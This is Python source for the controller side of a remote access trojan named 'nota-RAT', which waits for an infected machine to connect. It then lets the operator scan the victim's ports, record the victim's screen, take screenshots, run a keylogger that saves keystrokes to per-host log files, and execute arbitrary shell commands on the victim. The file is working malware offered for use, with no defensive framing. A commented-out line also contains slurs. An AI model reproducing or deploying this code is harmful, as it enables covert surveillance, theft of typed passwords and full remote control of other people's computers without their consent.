import socket
import argparse
import os 
import time
import sys
import random
from threading import Thread
from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook, DiscordEmbed


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument(
    "-p", "--port", default=421, help="Port of the Server", type=int
)


args = parser.parse_args()
SERVER_HOST = "0.0.0.0"
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


print("""
              _          _____         _______ 
             | |        |  __ \     /\|__   __|
  _ __   ___ | |_ __ _  | |__) |   /  \  | |   
 | '_ \ / _ \| __/ _` | |  _  /   / /\ \ | |   
 | | | | (_) | || (_| | | | \ \  / ____ \| |   
 |_| |_|\___/ \__\__,_| |_|  \_\/_/    \_\_|                                                
       nota RAT v 1.0 | fluffydolphin                 
""")


s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")


client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected! \n")


while True:
    command = input(f"$> ")
    if command == "exit":
        commands = "exit"
        client_socket.send(commands.encode())
        client_socket.close()
        s.close()
        break
    if command.lower() == "scan ports":
        print("not-portscanner \n")
        port_range = int(input("How many ports do you want to scan? "))
        print("scanning .....")
        startTime = time.time()
        open_ports = 0

        for i in range(0, port_range):
            host = client_socket.getpeername()[0]
            port = i
            timeout_seconds = 1
            port_scanner_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port_scanner_socket.settimeout(timeout_seconds)
            result = port_scanner_socket.connect_ex((host,int(port)))
            if result == 0:
                print("Host: {}, Port: {}".format(host, port))
            else:
                continue
            port_scanner_socket.close()
            open_ports += 1

        print("\nOpen ports: " + str(open_ports))
        executionTime = (time.time() - startTime)
        executionTime = int(executionTime)
        print('Execution time in seconds: ' + str(executionTime) + "\n")
    if command.lower() == "scan local ports":
        print("not-portscanner \n")
        client_socket.send("start local portscanner".encode())
        port_range = str(input("How many ports do you want to scan? "))
        print("scanning .....")
        client_socket.send(port_range.encode())
        open_ports = client_socket.recv(BUFFER_SIZE).decode()
        print(open_ports)
        open_portz = client_socket.recv(BUFFER_SIZE).decode()
        print(open_portz)
        executionTime = client_socket.recv(BUFFER_SIZE).decode()
        print(executionTime)

    if command.lower() == "record screen":
        filename = input("filename of recording: ")
        filename = filename + ".mp4"
        client_socket.send(command.encode())
        time_stop = input("how long do you want to record for: ")
        client_socket.send(time_stop.encode())
        print("recording ......\n")
        remaining = int.from_bytes(client_socket.recv(4),'big')
        f = open(f"./recordings/{filename}","wb")
        while remaining:
            data = client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
        print("recording recved successfully")
    if command.lower() == "take screenshot":
        filename = input("filename of screenshot: ")
        filename = filename + ".png"
        print("taking screenshot ......\n")
        client_socket.send(command.encode())
        remaining = int.from_bytes(client_socket.recv(4),'big')
        f = open(f"./screenshots/{filename}","wb")
        while remaining:
            data = client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
        print("screenshot recved successfully")


    if command.lower() == "start keylogger":
        def keylogger_loop():
            print("logging keys .....")
            LOGGER_HOST = "0.0.0.0"
            LOGGER_PORT = 422
            l = socket.socket()
            l.bind((LOGGER_HOST, LOGGER_PORT))
            l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            l.listen(5)
            client_socket.send(command.encode())
            logger_socket, logger_address = l.accept()
            def keylogger():
                while True:
                    if command.lower() == "stop keylogger":
                        client_socket.send(command.encode())
                        print("logging stopped")
                        break
                    msg = logger_socket.recv(BUFFER_SIZE).decode()
                    addr = logger_socket.getpeername()[0]
                    with open(f"./logs/{addr}-log.txt", "a+") as file1:
                        file1.write(f"{msg}")
            loggerz = Thread(target=keylogger)
            loggerz.daemon = True
            loggerz.start()
        keylogger_loopz = Thread(target=keylogger_loop)
        keylogger_loopz.daemon = True
        keylogger_loopz.start()
    if command == "send command":
        client_socket.send(command.encode())
        cwd = client_socket.recv(BUFFER_SIZE).decode()
        send_command = input(f"{cwd} $> ")
        if not send_command.strip():
            continue
        client_socket.send(send_command.encode())
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)
        

    #else: print("that aint a command cunt try again retard")

client_socket.close()
s.close()
